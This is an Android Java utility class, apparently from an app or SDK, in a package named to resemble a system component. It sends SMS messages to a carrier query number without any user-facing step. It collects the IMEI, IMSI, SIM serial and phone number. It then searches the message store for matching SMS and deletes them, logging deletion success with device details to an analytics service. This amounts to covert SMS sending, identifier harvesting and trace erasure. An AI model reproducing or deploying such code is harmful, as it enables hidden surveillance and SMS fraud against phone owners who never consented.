package com.android.sms.client;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.flurry.android.FlurryAgent;

import org.greenrobot.eventbus.EventBus;

import java.util.HashMap;
import java.util.Map;

/**
 * @author zyq 16-3-31
 */
public class SmsManageUtil {

	private static final boolean DEBUG = true;
	private static final String TAG = "SmsManageUtil";
	private Context context;
	private TelephonyManager telephonyManager;
	private static SmsManageUtil mInstance;
	private final String SMS_SERVICE = "pdus";
	private final String SMS_BODY = "body";
	private final String SMS_ID = "_id";
	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
	private final String SMS_CONTENT = "content://sms";


	public SmsManageUtil(Context context) {
		this.context = context;
		telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
	}

	public static SmsManageUtil getInstance(Context context) {
		if (mInstance == null) {
			synchronized (SmsManageUtil.class) {
				if (mInstance == null) {
					mInstance = new SmsManageUtil(context);
				}
			}
		}
		return mInstance;
	}


	public boolean isSIMexistOrAvaiable() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);//取得相关系统服务
		int state = tm.getSimState();
		if (state == TelephonyManager.SIM_STATE_READY) {
			return true;
		}
		return false;
	}


	//targetAddress运营商的查询电话，code 为我们查询的指令
	public void sendSMS(String targetAddress, String code) {
		//距离上次1分钟，不应发短信！！！！！！！

		if (DEBUG) {
			Log.d(TAG, "发送短信到" + targetAddress + "查手机号");
		}

		if (!TextUtils.isEmpty(code)) {
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage(targetAddress, null, code, null, null);
		}

	}

	public String getNativePhoneNumber1() {
		String phone = "";
		try {
			phone = telephonyManager.getLine1Number();
		} catch (Exception e) {
			if (DEBUG) {
				Log.e(TAG, "getNativePhoneNumber1函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return phone;
	}


	/**
	 * 调用系统接口获取imei
	 *
	 * @param context
	 * @return
	 */
	private static String getImeiFromSystemApi(Context context) {
		String imei = null;
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			if (telephonyManager != null) {
				String imeiStr = telephonyManager.getDeviceId();
				if (imeiStr != null) {
					imei = imeiStr;
					if (imei != null) {
						imei = imei.trim();
						if (imei.indexOf(" ") > -1) {
							imei.replace(" ", "");
						}
						if (imei.indexOf("-") > -1) {
							imei = imei.replace("-", "");
						}
						if (imei.indexOf("\n") > -1) {
							imei = imei.replace("\n", "");
						}
						String meidStr = "MEID:";
						int stratIndex = imei.indexOf(meidStr);
						if (stratIndex > -1) {
							imei = imei.substring(stratIndex + meidStr.length());
						}
						imei = imei.trim();
						imei = imei.toLowerCase();
						if (imei.length() < 10) {
							imei = null;
						}
					}
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, "getImeiFromSystemApi()函数异常:" + e.fillInStackTrace().toString());
			}
		}
		return imei;
	}


	public String getPhoneIMSI() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getSubscriberId();
	}

	public String getPhoneIMEI() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getDeviceId();
	}

	public String getPhoneInfo() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		StringBuilder sb = new StringBuilder();

		sb.append("\nDeviceId(IMEI) = " + tm.getDeviceId());
		sb.append("\nDeviceSoftwareVersion = " + tm.getDeviceSoftwareVersion());
		sb.append("\nLine1Number = " + tm.getLine1Number());
		sb.append("\nNetworkCountryIso = " + tm.getNetworkCountryIso());
		sb.append("\nNetworkOperator = " + tm.getNetworkOperator());
		sb.append("\nNetworkOperatorName = " + tm.getNetworkOperatorName());
		sb.append("\nNetworkType = " + tm.getNetworkType());
		sb.append("\nPhoneType = " + tm.getPhoneType());
		sb.append("\nSimCountryIso = " + tm.getSimCountryIso());
		sb.append("\nSimOperator = " + tm.getSimOperator());
		sb.append("\nSimOperatorName = " + tm.getSimOperatorName());
		sb.append("\nSimSerialNumber = " + tm.getSimSerialNumber());
		sb.append("\nSimState = " + tm.getSimState());
		sb.append("\nSubscriberId(IMSI) = " + tm.getSubscriberId());
		sb.append("\nVoiceMailNumber = " + tm.getVoiceMailNumber());
		return sb.toString();
	}


	public synchronized void deleteSMS(Context context, String smsContent) {
		try {
			if (DEBUG) {
				Log.d(TAG, "要删除的短信内容是：" + smsContent);
			}
			EventBus.getDefault().post(new MessageEvent("want to delete: " + smsContent));

			Uri uri = Uri.parse(SMS_CONTENT);
			ContentResolver contentResolver = context.getContentResolver();
			if (contentResolver != null) {
				String select = SMS_BODY + " LIKE ?";
				String[] selectArgs = new String[]{"%" + smsContent + "%"};
				Cursor isRead = contentResolver.query(uri, null, select, selectArgs, "date desc");
				boolean isExist = isRead.moveToFirst();
				if (isExist) {
					Log.d(TAG, "存在该字串！！！！");
					EventBus.getDefault().post(new MessageEvent("is exist!"));
					int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
					if (DEBUG) {
						Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
					}
					int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);

					final String device = Build.MODEL;
					final String verison = Build.VERSION.RELEASE;
					final boolean isDeleteSuccess = count >= 1 ? true : false;
					Map<String, String> map1 = new HashMap<>();
					map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
					FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS, map1);

					if (count >= 1) {
						Map<String, String> map = new HashMap<>();
						map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
						map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
						FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS, map);
					} else {
						Map<String, String> map = new HashMap<>();
						map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
						map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
						FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED, map);
					}
					if (DEBUG) {
						Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
								"删除失败"));
					}
					EventBus.getDefault().post(new MessageEvent((count >= 1) ? "delete success" : "delete failed"));
					isRead.close();
				}else{
					final String deleteFail = "sms not send or have been deleted!!";
					EventBus.getDefault().post(new MessageEvent(deleteFail));
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}

}
